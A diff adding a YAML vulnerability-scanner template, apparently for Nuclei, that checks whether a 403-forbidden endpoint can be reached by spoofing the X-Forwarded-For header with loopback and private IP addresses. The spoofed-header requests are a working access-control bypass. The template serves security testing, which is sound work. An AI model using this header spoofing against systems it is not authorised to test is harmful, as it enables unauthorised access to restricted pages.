@@ -1,0 +1,35 @@
+id: XFF-403-Bypass
+
+info:
+  name: X-Forwarded-For 403-forbidden bypass
+  author: super403
+  severity: info
+  description: 检测通过 X-Forwarded-For 头绕过 Nginx/Apache 代理及负载均衡器后的 403 禁止访问端点的模板。
+  tags: XFF,top10
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1
+
+      - |
+        GET /test.txt HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        X-Forwarded-For: 127.0.0.1, 0.0.0.0, 192.168.0.1, 10.0.0.1, 172.16.0.1
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403 && status_code_2 != 403"
+          - "status_code_1 == 403 && status_code_3 != 403"
+        condition: or
